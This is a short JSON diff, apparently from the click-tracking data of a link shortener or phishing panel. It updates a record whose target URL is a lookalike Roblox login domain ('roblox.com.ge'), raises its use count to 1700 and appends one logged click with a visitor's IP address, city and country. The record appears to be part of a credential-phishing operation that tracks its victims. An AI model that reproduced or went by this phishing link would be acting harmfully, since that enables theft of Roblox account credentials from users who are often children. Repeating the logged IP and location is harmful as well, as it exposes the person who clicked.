@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1699,
+    "useCount": 1700,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13760,6 +13760,14 @@
         "city": "Hounslow",
         "flag": "🇬🇧",
         "countryCode": "GB"
+      },
+      {
+        "timestamp": 1777668935769,
+        "ip": "45.230.103.116",
+        "country": "Brazil",
+        "city": "Curitiba",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
